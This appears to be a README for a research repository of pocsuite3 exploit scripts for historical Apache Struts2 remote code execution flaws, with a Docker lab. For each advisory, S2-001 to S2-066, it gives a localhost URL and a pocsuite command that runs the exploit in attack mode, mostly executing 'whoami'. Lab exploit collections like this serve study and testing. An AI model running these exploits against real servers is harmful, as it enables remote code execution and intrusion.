# Struts2 Exploits & Environment

## Legal Disclaimer

Unauthorized use of vulnerabilities to attack targets without prior mutual consent is illegal. The historical vulnerability information related to Struts2 contained in this repository has already been publicly disclosed on the internet. This repository serves only for collection and organization, strictly for learning and research purposes.

## 法律免责声明

未经事先双方同意，使用漏洞攻击目标是非法的。本仓库所包含的 Struts2历史漏洞信息早已在互联网上公开，此仓库只做收集整理，仅供学习和研究目的。

## Overview

This project is dedicated to organizing and collecting exploits related to historical vulnerabilities in Struts2. All exploits are authored using pocsuite3. 

## Vulnerability Environment

Execute the Docker command to pull and run the vulnerability environment.

```
docker run -it -p 8080:8080 isxiangyang/struts2-all-vul-pocsuite:latest
```

### S2-001

http://localhost:8080/S2-001/login.action

```
pocsuite -r 20090323_WEB_Apache_Struts2_001_RCE.py -u http://localhost:8080/S2-001/login.action --attack --command whoami 
```

### S2-003

http://localhost:8080/S2-003/HelloWorld.action

```
pocsuite -r 20090323_WEB_Apache_Struts2_003_RCE_CVE-2008-6504.py -u http://localhost:8080/S2-003/HelloWorld.action --attack --command whoami
```

### S2-005

http://localhost:8080/struts2-showcase-2.1.8/showcase.action

```
pocsuite -r 20100510_WEB_Apache_Struts2_005_RCE_CVE-2010-1870.py -u http://localhost:8080/struts2-showcase-2.1.8/showcase.action --attack --command whoami
```

### S2-007

 http://localhost:8080/S2-007/user.action 

```
pocsuite -r 20120108_WEB_Apache_Struts2_007_RCE.py -u http://localhost:8080/S2-007/user.action --attack --command whoami
```

### S2-008

http://localhost:8080/struts2-showcase-2.1.8/showcase.action

```
pocsuite -r 20120108_WEB_Apache_Struts2_008_RCE_CVE-2012-0394.py -u http://localhost:8080/struts2-showcase-2.1.8/showcase.action --attack --command whoami
```

### S2-009

http://localhost:8080/struts2-showcase-2.1.8/config-browser/showConfig.action

```
pocsuite -r 20111001_WEB_Apache_Struts2_009_RCE_CVE-2011-3923.py -u http://localhost:8080/struts2-showcase-2.1.8/config-browser/showConfig.action --attack --command whoami
```

### S2-012

http://localhost:8080/S2-012/index.action

```
pocsuite -r 20130219_WEB_Apache_Struts2_012_RCE_CVE-2013-1965.py -u http://localhost:8080/S2-012/index.action --attack --command whoami 
```

### S2-013

http://localhost:8080/S2-003/HelloWorld.action

```
pocsuite -r 20130219_WEB_Apache_Struts2_013_RCE_CVE-2013-1966.py  -u http://localhost:8080/S2-003/HelloWorld.action --attack --command whoami
```

### S2-015

http://localhost:8080/S2-015/

```
pocsuite -r 20130219_WEB_Apache_Struts2_015_RCE_CVE-2013-2134.py -u http://localhost:8080/S2-015/ --attack --command whoami
```

### S2-016

http://localhost:8080/struts2-showcase-2.1.8/showcase.action

```
pocsuite -r 20130219_WEB_Apache_Struts2_016_RCE_CVE-2013-2251.py -u http://localhost:8080/struts2-showcase-2.1.8/showcase.action --attack --command whoami 
```

### S2-019

http://localhost:8080/struts2-showcase-2.1.8/nodecorate/jspEval.action

```
pocsuite -r 20130612_WEB_Apache_Struts2_019_RCE_CVE-2013-4316.py -u http://localhost:8080/struts2-showcase-2.1.8/nodecorate/jspEval.action --attack --command whoami
```

### S2-020

http://localhost:8080/S2-003/HelloWorld.action

```
pocsuite -r 20131203_WEB_Apache_Struts2_020_RCE_CVE-2014-0094.py -u http://localhost:8080/S2-003/HelloWorld.action
```

### S2-025

http://localhost:8080/struts2-showcase-2.1.8/nodecorate/jspEval.action 

```
pocsuite -r 20150701_WEB_Apache_Struts2_025_RCE_CVE-2015-5169.py -u http://localhost:8080/struts2-showcase-2.1.8/nodecorate/jspEval.action  --attack --command whoami
```

### S2-029

http://localhost:8080/S2-029/default.action

```
pocsuite -r 20151216_WEB_Apache_Struts2_029_RCE_CVE-2016-0785.py -u http://localhost:8080/S2-029/default.action --attack --command whoami
```

### S2-032

http://localhost:8080/S2-032-showcase/index.action

```
pocsuite -r 20160310_WEB_Apache_Struts2_032_RCE_CVE-2016-3081.py -u http://localhost:8080/S2-032-showcase/index.action --attack --command whoami
```

### S2-033

http://localhost:8080/S2-033-rest/orders/4


```
pocsuite -r 20160310_WEB_Apache_Struts2_033_RCE_CVE-2016-3087.py -u http://localhost:8080/S2-033-rest/orders/4 --attack --command whoami
```

### S2-037

http://localhost:8080/S2-033-rest/orders/4

```
pocsuite -r 20160502_WEB_Apache_Struts2_037_RCE_CVE-2016-4438.py -u http://localhost:8080/S2-033-rest/orders/4 --attack --command whoami
```

### S2-045

http://localhost:8080/S2-032-showcase/fileupload/doUpload.action

```
pocsuite -r 20170129_WEB_Apache_Struts2_045_RCE_CVE-2017-5638.py -u http://localhost:8080/S2-032-showcase/fileupload/doUpload.action --attack --command whoami
```

### S2-046

http://localhost:8080/S2-032-showcase/fileupload/doUpload.action

```
pocsuite -r 20170411_WEB_Apache_Struts2_046_RCE_CVE-2017-7672.py -u http://localhost:8080/S2-032-showcase/fileupload/doUpload.action --attack --command whoami 
```

### S2-048

http://localhost:8080/S2-032-showcase/integration/saveGangster.action

```
pocsuite -r 20170621_WEB_Apache_Struts2_048_RCE_CVE-2017-9791.py -u http://localhost:8080/S2-032-showcase/integration/saveGangster.action --attack --command "whoami"
```

### S2-052

http://localhost:8080/S2-033-rest/orders

```
pocsuite -r 20170621_WEB_Apache_Struts2_052_RCE_CVE-2017-9805.py -u http://localhost:8080/S2-033-rest/orders --attack --command "touch /var/tmp/success.txt"
```

### S2-053

http://127.0.0.1:8080/S2-053/index.action

```
pocsuite -r 20170807_WEB_Apache_Struts2_053_RCE_CVE-2017-12611.py -u http://127.0.0.1:8080/S2-053/index.action --attack --command whoami
```

### S2-057

http://localhost:8080/S2-057/actionChain1.action

```
pocsuite -r 20180605_WEB_Apache_Struts2_057_RCE_CVE-2018-11776.py -u http://localhost:8080/S2-057/actionChain1.action --attack --command whoami
```

### S2-061

http://localhost:8080/S2-061/index.action

```
pocsuite -r 20200812_WEB_Apache_Struts2_061_RCE_CVE-2020-17530.py -u http://localhost:8080/S2-061/index.action --attack --command whoami 
```

### S2-066

http://127.0.0.1:8080/S2-066/upload

```
pocsuite -r 20231204_WEB_Apache_Struts2_066_RCE_CVE-2023-50164.py -u http://127.0.0.1:8080/S2-066/upload
```

